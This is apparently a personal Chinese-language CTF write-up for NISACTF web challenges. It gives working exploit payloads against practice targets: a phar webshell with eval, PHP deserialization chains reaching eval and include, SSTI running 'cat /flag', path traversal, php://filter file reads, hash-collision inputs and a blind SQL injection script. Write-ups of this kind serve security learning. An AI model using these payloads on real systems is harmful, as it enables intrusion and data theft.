## web

整个web做完，就sql没做出来。。。实在是没心情写sql，这东西太玄学了

### checkin

刚开始复制的时候就感觉奇奇怪怪的，这个题注释的颜色也奇奇怪怪的

![image-20220907095206938](D:\Typora\note\CTF\web\NISACTF.assets\image-20220907095206938.png)

双击前面的，后面也被选上了，感觉就像？？(倒过来了一样！！)
源码也看着奇奇怪怪的，和这个不一样

直接全选保存进txt，然后python读字节并url编码，这样一定是最完整不会错误的

```python
from urllib import parse
f=open('1.txt','rb')
t=f.read()
f.close()
t=parse.quote(t)
t.encode('utf-8')
print(t)
```

最后的payload

```tex
?ahahahaha=jitanglailo&%E2%80%AE%E2%81%A6Ugeiwo%E2%81%A9%E2%81%A6cuishiyuan=%E2%80%AE%E2%81%A6%20Flag%21%E2%81%A9%E2%81%A6N1SACTF
```

010下看到的

![image-20220907095517114](D:\Typora\note\CTF\web\NISACTF.assets\image-20220907095517114.png)

原理 [神奇的Unicode编码](https://www.xiinnn.com/article/22d50835.html)

其实就是浏览器渲染画面时被某些特殊的unicode让其从左往右输出或从右往左导致的

### easyssrf

一个单纯的**curl**，试试`file:///flag`，返回看不了，但提示了`/fl4g`，读一下

让我们访问**/ha1x1ux1u.php**

```php
<?php

highlight_file(__FILE__);
error_reporting(0);

$file = $_GET["file"];
if (stristr($file, "file")){
  die("你败了.");
}

//flag in /flag
echo file_get_contents($file);
```

直接php伪协议读flag

```php
?file=php://filter/convert.base64-encode/resource=/flag
```

### level-up

#### level1

**robots.txt**

#### level2

md5强碰撞(hackbar和postwoman都发不好，bp先抓包到POST发包内容，然后改值)

```php
POST：
array1=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%A3njn%FD%1A%CB%3A%29Wr%02En%CE%89%9A%E3%8EF%F1%BE%E9%EE3%0E%82%2A%95%23%0D%FA%CE%1C%F2%C4P%C2%B7s%0F%C8t%F28%FAU%AD%2C%EB%1D%D8%D2%00%8C%3B%FCN%C9b4%DB%AC%17%A8%BF%3Fh%84i%F4%1E%B5Q%7B%FC%B9RuJ%60%B4%0D7%F9%F9%00%1E%C1%1B%16%C9M%2A%7D%B2%BBoW%02%7D%8F%7F%C0qT%D0%CF%3A%9DFH%F1%25%AC%DF%FA%C4G%27uW%CFNB%E7%EF%B0&array2=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%A3njn%FD%1A%CB%3A%29Wr%02En%CE%89%9A%E3%8E%C6%F1%BE%E9%EE3%0E%82%2A%95%23%0D%FA%CE%1C%F2%C4P%C2%B7s%0F%C8t%F28zV%AD%2C%EB%1D%D8%D2%00%8C%3B%FCN%C9%E24%DB%AC%17%A8%BF%3Fh%84i%F4%1E%B5Q%7B%FC%B9RuJ%60%B4%0D%B7%F9%F9%00%1E%C1%1B%16%C9M%2A%7D%B2%BBoW%02%7D%8F%7F%C0qT%D0%CF%3A%1DFH%F1%25%AC%DF%FA%C4G%27uW%CF%CEB%E7%EF%B0
```

#### level3

sha1强碰撞，同上

```php
POST
array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1
```

#### level4

**url大写绕过**

#### level5





### babyupload

直接给出了源码

```py
from flask import Flask, request, redirect, g, send_from_directory
import sqlite3
import os
import uuid

app = Flask(__name__)

SCHEMA = """CREATE TABLE files (
id text primary key,
path text
);
"""


def db():
    g_db = getattr(g, '_database', None)
    if g_db is None:
        g_db = g._database = sqlite3.connect("database.db")
    return g_db


@app.before_first_request
def setup():
    os.remove("database.db")
    cur = db().cursor()
    cur.executescript(SCHEMA)


@app.route('/')
def hello_world():
    return """<!DOCTYPE html>
<html>
<body>
<form action="/upload" method="post" enctype="multipart/form-data">
    Select image to upload:
    <input type="file" name="file">
    <input type="submit" value="Upload File" name="submit">
</form>
<!-- /source -->
</body>
</html>"""


@app.route('/source')
def source():
    return send_from_directory(directory="/var/www/html/", path="www.zip", as_attachment=True)


@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return redirect('/')
    file = request.files['file']
    if "." in file.filename:
        return "Bad filename!", 403
    conn = db()
    cur = conn.cursor()
    uid = uuid.uuid4().hex
    try:
        cur.execute("insert into files (id, path) values (?, ?)", (uid, file.filename,))
    except sqlite3.IntegrityError:
        return "Duplicate file"
    conn.commit()

    file.save('uploads/' + file.filename)
    return redirect('/file/' + uid)


@app.route('/file/<id>')
def file(id):
    conn = db()
    cur = conn.cursor()
    cur.execute("select path from files where id=?", (id,))
    res = cur.fetchone()
    if res is None:
        return "File not found", 404

    # print(res[0])

    with open(os.path.join("uploads/", res[0]), "r") as f:
        return f.read()


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8011)

```

开始以为`cur.execute("select path from files where id=?", (id,))`这个地方存在sql注入
然后本地试了试发现还是会被转义

```mysql
SET GLOBAL log_output = 'TABLE';SET GLOBAL general_log = 'ON';  //日志开启

SET GLOBAL log_output = 'FILE'; SET GLOBAL general_log = 'OFF';  //日志关闭

文件位置：/www/server/data/mysql/general_log.CSV
看这个文件就可以看到查询记录
```

后来又仔细看了看，发现问题在这里

```python
os.path.join("uploads/", res[0])
```

这样生成的路径会产生目录查询漏洞的

```python
>>> print(os.path.join("uploads/","/flag"))
/flag
```

默认以后面`/`开头的为文件路径

直接取`/flag`的文件传是不行的，文件名不允许含`/`，只能抓包改文件名

### bingdundun~

有点莫名其妙的一题

```php
//index.php
<meta charset="utf8">
<?php
error_reporting(0);
$bingdundun = $_GET["bingdundun"];
if (!$bingdundun) echo '<a href="?bingdundun=upload">upload?</a>';
if(stristr($bingdundun,"input")||stristr($bingdundun, "filter")||stristr($bingdundun,"data")/*||stristr($bingdundun,"phar")*/){
	echo "STOP!~Hacker Wont GET Bingdundun FreeDom!";
	exit();
}else{
	include($bingdundun.".php");
}
?>
<!-- 你能找到bingdundun的flag嘛，就在这个目录下 -->
```

这是最后rce了拿到的源码
用了`include`并自己加了后缀`.php`

构造一个包含一句话木马的phar文件，改为`.zip`后缀传上去
然后用phar读一下就好了，加`.php`感觉有点没逻辑，毕竟`include`就可以直接把字符串以php形式渲染了
这个`.php`就使你的文件必须是php结尾，虽然读**upload**是用的`?bingdundun=upload`

但是没给源码还是有点迷

```php
<?php
    @unlink("xlccccc.phar");


    $phar = new Phar("xlccccc.phar"); //通过内置的Phar类实例化，后缀名必须为phar

    $phar->startBuffering(); //开始缓冲 Phar 写操作，不要修改磁盘上的 Phar 对象
    //可以理解为必须的操作，与stopBuffering()配对使用

    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub

    
    
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    
    $phar->addFromString("exp.php", "<?php eval(\$_GET[1]);?>"); //添加要压缩的文件
    //签名自动计算
    
    $phar->stopBuffering();
?>
```

```php
?bingdundun=phar://ec55f5fc31569b0d0c18289f304e1540.zip/exp&1=eval($_POST[1]);
```

### babyserialize

直接给出源码

```php
<?php
include "waf.php";
class NISA{
    public $fun="show_me_flag";
    public $txw4ever;
    public function __wakeup()
    {
        if($this->fun=="show_me_flag"){
            hint();
        }
    }

    function __call($from,$val){
        $this->fun=$val[0];
    }

    public function __toString()
    {
        echo $this->fun;
        return " ";
    }
    public function __invoke()
    {
        checkcheck($this->txw4ever);
        @eval($this->txw4ever);
    }
}

class TianXiWei{
    public $ext;
    public $x;
    public function __wakeup()
    {
        $this->ext->nisa($this->x);
    }
}

class Ilovetxw{
    public $huang;
    public $su;

    public function __call($fun1,$arg){
        $this->huang->fun=$arg[0];
    }

    public function __toString(){
        $bb = $this->su;
        return $bb();
    }
}

class four{
    public $a="TXW4EVER";
    private $fun='abc';

    public function __set($name, $value)
    {
        $this->$name=$value;
        if ($this->fun = "sixsixsix"){
            strtolower($this->a);
        }
    }
}

if(isset($_GET['ser'])){
    @unserialize($_GET['ser']);
}else{
    highlight_file(__FILE__);
}

//func checkcheck($data){
//  if(preg_match(......)){
//      die(something wrong);
//  }
//}

//function hint(){
//    echo ".......";
//    die();
//}
?>
```

有waf，有hint

先看看hint

```php
echo(serialize(new NISA());
# flag is in /
```

然后构造链子

很明显的一个**eval**

用唯一可控入口 **TianXiWei**的`__wakeup`进入**NISA**的`__wakeup和__call`(<font color='red'>**注意：如果将一个类与一个字符串比较时也能触发__toString，但是赋值为字符串不可以~**</font>)，这里就是`__wakeup`的if比较，然后进入了**Ilovetxw**的`__toString`，再由此进入**NISA**的`__invoke`从而rce

过滤了一些函数，但是⑧影响

```php
<?php
#include "waf.php";
class NISA{
    public $fun;
    public $txw4ever;
}

class TianXiWei{
    public $ext;
    public $x;

}

class Ilovetxw{
    public $huang;
    public $su;

}

class four{
    public $a="TXW4EVER";
    private $fun='abc';

}


$a=new TianXiWei();
$b=new Ilovetxw();
$c=new NISA();
$d=new NISA();


$d->txw4ever='echo(implode(scandir('/')))';// 'include("/fllllllaaag");'
$b->su=$d;
$c->fun=$b;
$a->ext=$c;
echo(serialize($a));
?>
```

### midlevel

CLIENT-IP伪造，然后php的SSTI

CLIENT-IP:{{system('cat /flag')}}

### join-us

用到了无列名join注入，先放着吧

有个小知识，因为as被ban导致database没了，想获取库名可以看报错信息

```sql
0'||(select * from aa);#
Table 'sqlsql.aa' doesn't exist
```

### is secret

照搬的[CISCN 2019华东南]Double Secret

### popchains

```php
<?php

echo 'Happy New Year~ MAKE A WISH<br>';

if(isset($_GET['wish'])){
    @unserialize($_GET['wish']);
}
else{
    $a=new Road_is_Long;
    highlight_file(__FILE__);
}
/***************************pop your 2022*****************************/

class Road_is_Long{
    public $page;
    public $string;
    public function __construct($file='index.php'){
        $this->page = $file;
    }
    public function __toString(){
        return $this->string->page;
    }

    public function __wakeup(){
        if(preg_match("/file|ftp|http|https|gopher|dict|\.\./i", $this->page)) {
            echo "You can Not Enter 2022";
            $this->page = "index.php";
        }
    }
}

class Try_Work_Hard{
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Make_a_Change{
    public $effort;
    public function __construct(){
        $this->effort = array();
    }

    public function __get($key){
        $function = $this->effort;
        return $function();
    }
}
/**********************Try to See flag.php*****************************/
```

也是一个比较简单的反序列化

```php
if(preg_match("/file|ftp|http|https|gopher|dict|\.\./i", $this->page))
```

这里把**$this->page**当成字符串了，所以可以触发**__toString**，下面的链子就很简单了

pop

```php
<?php

class Road_is_Long{
    public $page;
    public $string;

}

class Try_Work_Hard{
    public  $var;

}

class Make_a_Change{
    public $effort; //这里把protected改成了public便于赋值

}

$a=new Road_is_Long();
$b=new Road_is_Long();
$c=new Try_Work_Hard();
$d=new Make_a_Change();

$a->page=$b;
$b->string=$d;
$d->effort=$c;
$c->var='php://filter/convert.base64-encode/resource=/flag';

$e=serialize($a);
//unserialize($e);
echo($e);

```



### middlerce

```php
<?php
include "check.php";
if (isset($_REQUEST['letter'])){
    $txw4ever = $_REQUEST['letter'];
    if (preg_match('/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&|!|\<|\>|\{|\x09|\x0a|\[).*$/m',$txw4ever)){
        die("再加把油喔");
    }
    else{
        $command = json_decode($txw4ever,true)['cmd'];
        checkdata($command);
        @eval($command);
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

有一个正则绕过和一个对函数的检查

正则绕过了很多函数，但是他对**command**的读取是读取json格式的**cmd**，所以你可以掺入一些废数据

所以你可以超过正则最大匹配限度从而绕过正则

对函数的检查也很多，选个最简单的就行

payload

```python
import requests


import requests
payload = '{"cmd":"system(ls);","test":"' + "@"*(1000000) + '"}'
res = requests.post("http://1.14.71.254:28272/", data={"letter":payload})
print(res.text)
```

### hardsql

脚本注出密码然后登陆

```python
import requests

url='http://1.14.71.254:28138/login.php'
str='abcdefghijklmnopqrstuvwxyz0123456789'
flag=''
for i in range(0,666):
    for j in str:
        data={"passwd":f"-1'/**/or/**/passwd/**/like/**/'{flag+j}%'#",
              "username":"bilala"
              }
        r=requests.post(url=url,data=data)
        #print(j)
        if "nothing found" not in r.text:
            flag+=j
            print(flag)
            if j=='}':
                exit()
            break
#b2f2d15b3ae082ca29697d8dcd420fd7
```

看到源码

```php
<?php
//多加了亿点点过滤

include_once("config.php");
function alertMes($mes,$url){
    die("<script>alert('{$mes}');location.href='{$url}';</script>");
}

function checkSql($s) {
    if(preg_match("/if|regexp|between|in|flag|=|>|<|and|\||right|left|insert|database|reverse|update|extractvalue|floor|join|substr|&|;|\\\$|char|\x0a|\x09|column|sleep|\ /i",$s)){
        alertMes('waf here', 'index.php');
    }
}

if (isset($_POST['username']) && $_POST['username'] != '' && isset($_POST['passwd']) && $_POST['passwd'] != '') {
    $username=$_POST['username'];
    $password=$_POST['passwd'];
    if ($username !== 'bilala') {
        alertMes('only bilala can login', 'index.php');
    }
    checkSql($password);
    $sql="SELECT passwd FROM users WHERE username='bilala' and passwd='$password';";
    $user_result=mysqli_query($MysqlLink,$sql);
    $row = mysqli_fetch_array($user_result);
    if (!$row) {
        alertMes('nothing found','index.php');
    }
    if ($row['passwd'] === $password) {
        if($password == 'b2f2d15b3ae082ca29697d8dcd420fd7'){
            show_source(__FILE__);
            die;
        }
        else{
            die($FLAG);
        }
    } else {
        alertMes("wrong password",'index.php');
    }
}

?>
```

然后是一个不停的**replace**，记得做过，可是找不到了

有心情再写吧。。。最近实在不想碰sql注入了...

## misc

misc有空的时候做做吧，最近作业和论文都堆着没解决
